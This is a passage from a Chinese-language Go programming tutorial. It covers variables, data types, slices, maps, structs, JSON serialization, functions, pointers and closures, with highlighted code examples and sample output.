<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> firstName <span class="keyword">string</span></span><br><span class="line"><span class="comment">//或者直接不指定变量类型直接赋值，go会自己推断</span></span><br><span class="line"><span class="keyword">var</span> (</span><br><span class="line">firstName,lastName =  <span class="string">&quot;harry&quot;</span>,<span class="string">&quot;smith&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">//使用:=赋值，要声明的变量必须是新变量。 如果使用冒号等于号并已经声明该变量，将不会对程序进行编译。 </span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    firstName, lastName := <span class="string">&quot;John&quot;</span>, <span class="string">&quot;Doe&quot;</span></span><br><span class="line">    fmt.Println(firstName, lastName)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
<li><p>定义常量</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> httpstatus = <span class="number">200</span></span><br><span class="line"><span class="keyword">const</span> (</span><br><span class="line">    StatusOK              = <span class="number">0</span></span><br><span class="line">    StatusConnectionReset = <span class="number">1</span></span><br><span class="line">    StatusOtherError      = <span class="number">2</span></span><br><span class="line">)</span><br><span class="line"><span class="comment">//不能使用冒号等于号来声明常量  </span></span><br></pre></td></tr></table></figure></li>
</ul>
<p>如果变量定义了未使用go会抛出错误</p>
<h3 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h3><p>Go 有四类数据类型：</p>
<ul>
<li>基本类型：数字、字符串和布尔值</li>
<li>聚合类型：数组和结构</li>
<li>引用类型：指针、切片、映射、函数和通道</li>
<li>接口类型：接口</li>
</ul>
<h4 id="数字"><a href="#数字" class="headerlink" title="数字"></a>数字</h4><p>一般使用　<strong>int</strong> （当计算机是32位时表示32位的int , 64位时位64位int）</p>
<p>Go 还提供了 <code>int8</code>、<code>int16</code>、<code>int32</code> 和 <code>int64</code> 类型，其大小分别为 8、16、32 或 64 位的整数</p>
<p>只有<strong>float32</strong> <strong>float64</strong>两种</p>
<h4 id="布耳"><a href="#布耳" class="headerlink" title="布耳"></a>布耳</h4><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// go的bool类型只能用于显式赋值，0,1不能标识对应的布耳值</span></span><br><span class="line"><span class="keyword">var</span> flag <span class="keyword">bool</span> = <span class="literal">true</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>





<h4 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h4><p>string</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">fullName := <span class="string">&quot;John Doe \t(alias \&quot;Foo\&quot;)\n&quot;</span></span><br><span class="line">fmt.Println(fullName)</span><br></pre></td></tr></table></figure>



<ul>
<li><p>转换</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">//使用自带的函数转换</span></span><br><span class="line"><span class="keyword">var</span> integer16 <span class="keyword">int16</span> = <span class="number">127</span></span><br><span class="line"><span class="keyword">var</span> integer32 <span class="keyword">int32</span> = <span class="number">32767</span></span><br><span class="line">fmt.Println(<span class="keyword">int32</span>(integer16) + integer32)</span><br><span class="line"></span><br><span class="line"><span class="comment">//使用strconv包来转换</span></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;strconv&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    i, _ := strconv.Atoi(<span class="string">&quot;-42&quot;</span>)</span><br><span class="line">    s := strconv.Itoa(<span class="number">-42</span>)</span><br><span class="line">    fmt.<span class="built_in">println</span>(i, s)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//下划线 (_) 用作变量的名称（如果他是变量程序没法编译，因为变量需要用到使用才能通过编译）。 在 Go 中，这意味着我们不会使用该变量的值，而是要将其忽略。</span></span><br></pre></td></tr></table></figure></li>
</ul>
<p><strong>变量默认值</strong></p>
<ul>
<li><code>int</code> 类型的 <code>0</code>（及其所有子类型，如 <code>int64</code>）</li>
<li><code>float32</code> 和 <code>float64</code> 类型的 <code>+0.000000e+000</code></li>
<li><code>bool</code> 类型的 <code>false</code></li>
<li><code>string</code> 类型的空值</li>
</ul>
<h4 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h4><p>要在 Go 中声明数组，必须定义其元素的数据类型以及该数组可容纳的元素数目。 然后，可采用下标表示法访问数组中的每个元素，其中第一个元素是 0，最后一个元素是数组长度减去 1（长度 - 1）。</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a [<span class="number">3</span>]<span class="keyword">int</span></span><br><span class="line">a[<span class="number">1</span>] = <span class="number">10</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//给数组初始值</span></span><br><span class="line">cities := [<span class="number">5</span>]<span class="keyword">string</span>&#123;<span class="string">&quot;New York&quot;</span>, <span class="string">&quot;Paris&quot;</span>, <span class="string">&quot;Berlin&quot;</span>, <span class="string">&quot;Madrid&quot;</span>&#125;</span><br><span class="line">fmt.Println(<span class="string">&quot;Cities:&quot;</span>, cities)</span><br><span class="line"><span class="comment">//支持多维数组是</span></span><br><span class="line"><span class="keyword">var</span> twoD [<span class="number">3</span>][<span class="number">5</span>]<span class="keyword">int</span></span><br></pre></td></tr></table></figure>

<h4 id="slice"><a href="#slice" class="headerlink" title="slice"></a>slice</h4><figure class="highlight go"><table><tr><td class="code"><pre><span class="line">months := []<span class="keyword">string</span>&#123;<span class="string">&quot;January&quot;</span>, <span class="string">&quot;February&quot;</span>, <span class="string">&quot;March&quot;</span>, <span class="string">&quot;April&quot;</span>, <span class="string">&quot;May&quot;</span>, <span class="string">&quot;June&quot;</span>, <span class="string">&quot;July&quot;</span>, <span class="string">&quot;August&quot;</span>, <span class="string">&quot;September&quot;</span>, <span class="string">&quot;October&quot;</span>, <span class="string">&quot;November&quot;</span>, <span class="string">&quot;December&quot;</span>&#125;</span><br><span class="line">quarter1 := months[<span class="number">0</span>:<span class="number">3</span>]</span><br><span class="line">quarter2 := months[<span class="number">3</span>:<span class="number">6</span>]</span><br><span class="line">quarter3 := months[<span class="number">6</span>:<span class="number">9</span>]</span><br><span class="line">quarter4 := months[<span class="number">9</span>:<span class="number">12</span>]</span><br><span class="line"><span class="comment">//len函数为长度，cap为容量会自动向后拓展直到整个数组</span></span><br><span class="line">fmt.Println(quarter1, <span class="built_in">len</span>(quarter1), <span class="built_in">cap</span>(quarter1))</span><br><span class="line">fmt.Println(quarter2, <span class="built_in">len</span>(quarter2), <span class="built_in">cap</span>(quarter2))</span><br><span class="line">fmt.Println(quarter3, <span class="built_in">len</span>(quarter3), <span class="built_in">cap</span>(quarter3))</span><br><span class="line">fmt.Println(quarter4, <span class="built_in">len</span>(quarter4), <span class="built_in">cap</span>(quarter4))</span><br><span class="line"></span><br><span class="line"><span class="comment">//output</span></span><br><span class="line">[January February March] <span class="number">3</span> <span class="number">12</span></span><br><span class="line">[April May June] <span class="number">3</span> <span class="number">9</span></span><br><span class="line">[July August September] <span class="number">3</span> <span class="number">6</span></span><br><span class="line">[October November December] <span class="number">3</span> <span class="number">3</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>append(原数组，添加元素)</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">//拓展切片的capacity 函数append()</span></span><br><span class="line"> <span class="keyword">var</span> numbers []<span class="keyword">int</span></span><br><span class="line">    <span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">10</span>; i++ &#123;</span><br><span class="line">        numbers = <span class="built_in">append</span>(numbers, i)</span><br><span class="line">        fmt.Printf(<span class="string">&quot;%d\tcap=%d\t%v\n&quot;</span>, i, <span class="built_in">cap</span>(numbers), numbers)</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//输出</span></span><br><span class="line"><span class="number">0</span>       <span class="built_in">cap</span>=<span class="number">1</span>   [<span class="number">0</span>]</span><br><span class="line"><span class="number">1</span>       <span class="built_in">cap</span>=<span class="number">2</span>   [<span class="number">0</span> <span class="number">1</span>]</span><br><span class="line"><span class="number">2</span>       <span class="built_in">cap</span>=<span class="number">4</span>   [<span class="number">0</span> <span class="number">1</span> <span class="number">2</span>]</span><br><span class="line"><span class="number">3</span>       <span class="built_in">cap</span>=<span class="number">4</span>   [<span class="number">0</span> <span class="number">1</span> <span class="number">2</span> <span class="number">3</span>]</span><br><span class="line"><span class="number">4</span>       <span class="built_in">cap</span>=<span class="number">8</span>   [<span class="number">0</span> <span class="number">1</span> <span class="number">2</span> <span class="number">3</span> <span class="number">4</span>]</span><br><span class="line"><span class="number">5</span>       <span class="built_in">cap</span>=<span class="number">8</span>   [<span class="number">0</span> <span class="number">1</span> <span class="number">2</span> <span class="number">3</span> <span class="number">4</span> <span class="number">5</span>]</span><br><span class="line"><span class="number">6</span>       <span class="built_in">cap</span>=<span class="number">8</span>   [<span class="number">0</span> <span class="number">1</span> <span class="number">2</span> <span class="number">3</span> <span class="number">4</span> <span class="number">5</span> <span class="number">6</span>]</span><br><span class="line"><span class="number">7</span>       <span class="built_in">cap</span>=<span class="number">8</span>   [<span class="number">0</span> <span class="number">1</span> <span class="number">2</span> <span class="number">3</span> <span class="number">4</span> <span class="number">5</span> <span class="number">6</span> <span class="number">7</span>]</span><br><span class="line"><span class="number">8</span>       <span class="built_in">cap</span>=<span class="number">16</span>  [<span class="number">0</span> <span class="number">1</span> <span class="number">2</span> <span class="number">3</span> <span class="number">4</span> <span class="number">5</span> <span class="number">6</span> <span class="number">7</span> <span class="number">8</span>]</span><br><span class="line"><span class="number">9</span>       <span class="built_in">cap</span>=<span class="number">16</span>  [<span class="number">0</span> <span class="number">1</span> <span class="number">2</span> <span class="number">3</span> <span class="number">4</span> <span class="number">5</span> <span class="number">6</span> <span class="number">7</span> <span class="number">8</span> <span class="number">9</span>]</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">当切片容量不足以容纳更多元素时，Go 的容量将翻倍。 它将新建一个具有新容量的基础数组。 无需执行任何操作即可使容量增加。 Go 会自动扩充容量。 需要谨慎操作。 有时，一个切片具有的容量可能比它需要的多得多，这样你将会浪费内存。*/</span></span><br></pre></td></tr></table></figure>

<ul>
<li><p>删除切片中的元素，只能用append()来实现</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">a := []<span class="keyword">int</span>&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>&#125;</span><br><span class="line">a = <span class="built_in">append</span>(a[:<span class="number">2</span>], a[<span class="number">3</span>:]...)</span><br><span class="line"><span class="comment">//删除了元素值&#x27;2&#x27;的元素</span></span><br><span class="line"><span class="comment">//[1 2 4 5 6]</span></span><br></pre></td></tr></table></figure></li>
<li><p>创建副本　</p>
<p>Go 具有内置函数 <code>copy(dst, src []Type)</code> 用于创建切片的副本。 你需要发送目标切片和源切片。</p>
</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">letters := []<span class="keyword">string</span>&#123;<span class="string">&quot;A&quot;</span>, <span class="string">&quot;B&quot;</span>, <span class="string">&quot;C&quot;</span>, <span class="string">&quot;D&quot;</span>, <span class="string">&quot;E&quot;</span>&#125;</span><br><span class="line">slice2 := <span class="built_in">make</span>([]<span class="keyword">string</span>, <span class="number">3</span>)</span><br><span class="line"><span class="built_in">copy</span>(slice2, letters[<span class="number">1</span>:<span class="number">4</span>])</span><br><span class="line">fmt.Println(slice2)</span><br><span class="line"><span class="comment">// [B C D]</span></span><br></pre></td></tr></table></figure>



<h4 id="map-key-value"><a href="#map-key-value" class="headerlink" title="map(key-value)"></a>map(key-value)</h4><figure class="highlight go"><table><tr><td class="code"><pre><span class="line">  studentsAge := <span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">int</span>&#123;</span><br><span class="line">        <span class="string">&quot;john&quot;</span>: <span class="number">32</span>,</span><br><span class="line">        <span class="string">&quot;bob&quot;</span>:  <span class="number">31</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    fmt.Println(studentsAge)</span><br><span class="line"><span class="comment">//map[bob:31 john:32]</span></span><br></pre></td></tr></table></figure>

<p>map操作</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">//创建一个空的map</span></span><br><span class="line">studentsAge := <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">int</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">//创建新项</span></span><br><span class="line">studentsAge[<span class="string">&quot;john&quot;</span>] = <span class="number">32</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//判断是否存在map中</span></span><br><span class="line">studentsAge := <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">int</span>)</span><br><span class="line">studentsAge[<span class="string">&quot;john&quot;</span>] = <span class="number">32</span></span><br><span class="line">studentsAge[<span class="string">&quot;bob&quot;</span>] = <span class="number">31</span></span><br><span class="line"></span><br><span class="line">age, exist := studentsAge[<span class="string">&quot;christy&quot;</span>]</span><br><span class="line"><span class="keyword">if</span> exist &#123;</span><br><span class="line">    fmt.Println(<span class="string">&quot;Christy&#x27;s age is&quot;</span>, age)</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    fmt.Println(<span class="string">&quot;Christy&#x27;s age couldn&#x27;t be found&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//删除项</span></span><br><span class="line"><span class="built_in">delete</span>(studentAge,<span class="string">&quot;john&quot;</span>)</span><br><span class="line"><span class="comment">//删除不存在的项，你不会遇到错误，而且会看到以下输出：map[bob:31 john:32]</span></span><br><span class="line"><span class="built_in">delete</span>(studentsAge, <span class="string">&quot;christy&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//遍历map</span></span><br><span class="line"><span class="keyword">for</span> name, age := <span class="keyword">range</span> studentsAge &#123;</span><br><span class="line">    fmt.Printf(<span class="string">&quot;%s\t%d\n&quot;</span>, name, age)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="struct"><a href="#struct" class="headerlink" title="struct"></a>struct</h4><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//格式，类似c语言的结构体</span></span><br><span class="line"><span class="keyword">type</span> Person <span class="keyword">struct</span> &#123;</span><br><span class="line">	ID        <span class="keyword">int</span></span><br><span class="line">	FirstName <span class="keyword">string</span></span><br><span class="line">	LastName  <span class="keyword">string</span></span><br><span class="line">	Address   <span class="keyword">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//可以理解成 继承，或者嵌套，Employee中嵌套了Person的结构体</span></span><br><span class="line"><span class="keyword">type</span> Employee <span class="keyword">struct</span> &#123;</span><br><span class="line">	Person</span><br><span class="line">	ManagerID <span class="keyword">int</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Contractor <span class="keyword">struct</span> &#123;</span><br><span class="line">	Person</span><br><span class="line">	CompanyID <span class="keyword">int</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	employee := Employee&#123;&#125;</span><br><span class="line">	employee.LastName = <span class="string">&quot;Doe&quot;</span></span><br><span class="line">	fmt.Println(employee.LastName)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//Doe</span></span><br></pre></td></tr></table></figure>





<h4 id="json序列化及其反序列化"><a href="#json序列化及其反序列化" class="headerlink" title="json序列化及其反序列化"></a>json序列化及其反序列化</h4><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;encoding/json&quot;</span></span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Person <span class="keyword">struct</span> &#123;</span><br><span class="line">	ID        <span class="keyword">int</span></span><br><span class="line">    <span class="comment">/*这里的反引号部分是struct tag,可以决定序列化的结果</span></span><br><span class="line"><span class="comment">    比如这里FirstName写了name</span></span><br><span class="line"><span class="comment">    当序列化成json的时候key值就会变成name而不是FirstName</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">	FirstName <span class="keyword">string</span> <span class="string">`json:&quot;name&quot;`</span></span><br><span class="line">	LastName  <span class="keyword">string</span></span><br><span class="line">    <span class="comment">//这里的omitempty含义是省略，当address为value空时，省略这个键值对</span></span><br><span class="line">	Address   <span class="keyword">string</span> <span class="string">`json:&quot;address,omitempty&quot;`</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Employee <span class="keyword">struct</span> &#123;</span><br><span class="line">	Person</span><br><span class="line">	ManagerID <span class="keyword">int</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Contractor <span class="keyword">struct</span> &#123;</span><br><span class="line">	Person</span><br><span class="line">	CompanyID <span class="keyword">int</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	employees := []Employee&#123;</span><br><span class="line">		&#123;</span><br><span class="line">			Person: Person&#123;</span><br><span class="line">				LastName: <span class="string">&quot;Doe&quot;</span>, FirstName: <span class="string">&quot;John&quot;</span>, Address: <span class="string">&quot;balabala&quot;</span>,</span><br><span class="line">			&#125;,</span><br><span class="line">		&#125;,</span><br><span class="line">		&#123;</span><br><span class="line">			Person: Person&#123;</span><br><span class="line">				LastName: <span class="string">&quot;Campbell&quot;</span>, FirstName: <span class="string">&quot;David&quot;</span>,</span><br><span class="line">			&#125;,</span><br><span class="line">		&#125;,</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//json序列化</span></span><br><span class="line">	data, _ := json.Marshal(employees)</span><br><span class="line">	fmt.Printf(<span class="string">&quot;%s\n&quot;</span>, data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//反序列化</span></span><br><span class="line">	<span class="keyword">var</span> decoded []Employee</span><br><span class="line">	json.Unmarshal(data, &amp;decoded)</span><br><span class="line">	fmt.Printf(<span class="string">&quot;%v\n&quot;</span>, decoded)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//输出结果</span></span><br><span class="line">[&#123;<span class="string">&quot;ID&quot;</span>:<span class="number">0</span>,<span class="string">&quot;name&quot;</span>:<span class="string">&quot;John&quot;</span>,<span class="string">&quot;LastName&quot;</span>:<span class="string">&quot;Doe&quot;</span>,<span class="string">&quot;address&quot;</span>:<span class="string">&quot;balabala&quot;</span>,<span class="string">&quot;ManagerID&quot;</span>:<span class="number">0</span>&#125;,&#123;<span class="string">&quot;ID&quot;</span>:<span class="number">0</span>,<span class="string">&quot;name&quot;</span>:<span class="string">&quot;David&quot;</span>,<span class="string">&quot;LastName&quot;</span>:<span class="string">&quot;Campbell&quot;</span>,<span class="string">&quot;ManagerID&quot;</span>:<span class="number">0</span>&#125;]</span><br><span class="line">[&#123;&#123;<span class="number">0</span> John Doe balabala&#125; <span class="number">0</span>&#125; &#123;&#123;<span class="number">0</span> David Campbell &#125; <span class="number">0</span>&#125;]</span><br></pre></td></tr></table></figure>



<p>序列化详细知识：<a href="https://sanyuesha.com/2018/05/07/go-json/">https://sanyuesha.com/2018/05/07/go-json/</a></p>
<h3 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h3><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">name</span><span class="params">(parameters)</span> <span class="params">(results)</span></span> &#123;</span><br><span class="line">    body-content</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>函数类似js的语法</p>
<p>可以带多个返回值</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;os&quot;</span></span><br><span class="line">	<span class="string">&quot;strconv&quot;</span></span><br><span class="line">)</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="comment">//从命令行读取两个参数传入calc函数，注意下标不是从0开始</span></span><br><span class="line">	add_sum, mul_sum := calc(os.Args[<span class="number">1</span>], os.Args[<span class="number">2</span>])</span><br><span class="line">    fmt.Println(add_sum, mul_sum)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//多个返回值的时候标注返回值类型(参数1类型，参数2类型)</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">calc</span><span class="params">(number1 <span class="keyword">string</span>, number2 <span class="keyword">string</span>)</span> <span class="params">(<span class="keyword">int</span>, <span class="keyword">int</span>)</span></span> &#123;</span><br><span class="line">   <span class="comment">//str-&gt;int </span></span><br><span class="line">	int1, _ := strconv.Atoi(number1)</span><br><span class="line">	int2, _ := strconv.Atoi(number2)</span><br><span class="line">	sum := int1 + int2</span><br><span class="line">	mul := int1 * int2</span><br><span class="line">	<span class="keyword">return</span> sum, mul</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>​    </p>
<h4 id="指针"><a href="#指针" class="headerlink" title="指针"></a>指针</h4><ul>
<li><code>&amp;</code> 运算符使用其后对象的地址。</li>
<li><code>*</code> 运算符取消引用指针。 也就是说，你可以前往指针中包含的地址访问其中的对象。</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    firstName := <span class="string">&quot;John&quot;</span></span><br><span class="line">    updateName(&amp;firstName)</span><br><span class="line">    fmt.<span class="built_in">println</span>(firstName)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">updateName</span><span class="params">(name *<span class="keyword">string</span>)</span></span> &#123;</span><br><span class="line">    *name = <span class="string">&quot;David&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//将John改成了David</span></span><br></pre></td></tr></table></figure>

<p>　#### 匿名函数<br>1、不带参数</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">   f:=<span class="function"><span class="keyword">func</span><span class="params">()</span></span>&#123;</span><br><span class="line">      fmt.Println(<span class="string">&quot;hello world&quot;</span>)</span><br><span class="line">   &#125;</span><br><span class="line">   f()<span class="comment">//hello world</span></span><br><span class="line">   fmt.Printf(<span class="string">&quot;%T\n&quot;</span>, f) <span class="comment">//打印 func()</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>2、带参数</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">   f:=<span class="function"><span class="keyword">func</span><span class="params">(args <span class="keyword">string</span>)</span></span>&#123;</span><br><span class="line">      fmt.Println(args)</span><br><span class="line">   &#125;</span><br><span class="line">   f(<span class="string">&quot;hello world&quot;</span>)<span class="comment">//hello world</span></span><br><span class="line">   <span class="comment">//或</span></span><br><span class="line">   (<span class="function"><span class="keyword">func</span><span class="params">(args <span class="keyword">string</span>)</span></span>&#123;</span><br><span class="line">        fmt.Println(args)</span><br><span class="line">    &#125;)(<span class="string">&quot;hello world&quot;</span>)<span class="comment">//hello world</span></span><br><span class="line">    <span class="comment">//或</span></span><br><span class="line">    <span class="function"><span class="keyword">func</span><span class="params">(args <span class="keyword">string</span>)</span></span> &#123;</span><br><span class="line">        fmt.Println(args)</span><br><span class="line">    &#125;(<span class="string">&quot;hello world&quot;</span>) <span class="comment">//hello world</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>3、带返回值</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">   f:=<span class="function"><span class="keyword">func</span><span class="params">()</span><span class="title">string</span></span>&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="string">&quot;hello world&quot;</span></span><br><span class="line">   &#125;</span><br><span class="line">   a:=f()</span><br><span class="line">   fmt.Println(a)<span class="comment">//hello world</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>4、多个匿名函数</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">   f1,f2:=F(<span class="number">1</span>,<span class="number">2</span>)</span><br><span class="line">   fmt.Println(f1(<span class="number">4</span>))<span class="comment">//6</span></span><br><span class="line">   fmt.Println(f2())<span class="comment">//6</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">F</span><span class="params">(x, y <span class="keyword">int</span>)</span><span class="params">(<span class="keyword">func</span>(<span class="keyword">int</span>)</span><span class="title">int</span>,<span class="title">func</span><span class="params">()</span><span class="title">int</span>)</span> &#123;</span><br><span class="line">   f1 := <span class="function"><span class="keyword">func</span><span class="params">(z <span class="keyword">int</span>)</span> <span class="title">int</span></span> &#123;</span><br><span class="line">      <span class="keyword">return</span> (x + y) * z / <span class="number">2</span></span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   f2 := <span class="function"><span class="keyword">func</span><span class="params">()</span> <span class="title">int</span></span> &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">2</span> * (x + y)</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">return</span> f1,f2</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="闭包（closure）"><a href="#闭包（closure）" class="headerlink" title="闭包（closure）"></a>闭包（closure）</h4><p>闭包：说白了就是函数的嵌套，<strong>内层的函数可以使用外层函数的所有变量，即使外层函数已经执行完毕</strong>。</p>
<p>示例：</p>
<p>1、</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    a := Fun()</span><br><span class="line">    b:=a(<span class="string">&quot;hello &quot;</span>)</span><br><span class="line">    c:=a(<span class="string">&quot;hello &quot;</span>)</span><br><span class="line">    fmt.Println(b)<span class="comment">//worldhello </span></span><br><span class="line">    fmt.Println(c)<span class="comment">//worldhello hello </span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Fun</span><span class="params">()</span> <span class="title">func</span><span class="params">(<span class="keyword">string</span>)</span> <span class="title">string</span></span> &#123;</span><br><span class="line">    a := <span class="string">&quot;world&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">func</span><span class="params">(args <span class="keyword">string</span>)</span> <span class="title">string</span></span> &#123;</span><br><span class="line">        a += args</span><br><span class="line">        <span class="keyword">return</span>  a</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>2、</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">   a := Fun()</span><br><span class="line">   d := Fun()</span><br><span class="line">   b:=a(<span class="string">&quot;hello &quot;</span>)</span><br><span class="line">   c:=a(<span class="string">&quot;hello &quot;</span>)</span><br><span class="line">   e:=d(<span class="string">&quot;hello &quot;</span>)</span><br><span class="line">   f:=d(<span class="string">&quot;hello &quot;</span>)</span><br><span class="line">   fmt.Println(b)<span class="comment">//worldhello</span></span><br><span class="line">   fmt.Println(c)<span class="comment">//worldhello hello</span></span><br><span class="line">   fmt.Println(e)<span class="comment">//worldhello</span></span><br><span class="line">   fmt.Println(f)<span class="comment">//worldhello hello</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Fun</span><span class="params">()</span> <span class="title">func</span><span class="params">(<span class="keyword">string</span>)</span> <span class="title">string</span></span> &#123;</span><br><span class="line">   a := <span class="string">&quot;world&quot;</span></span><br><span class="line">   <span class="keyword">return</span> <span class="function"><span class="keyword">func</span><span class="params">(args <span class="keyword">string</span>)</span> <span class="title">string</span></span> &#123;</span><br><span class="line">      a += args</span><br><span class="line">      <span class="keyword">return</span>  a</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
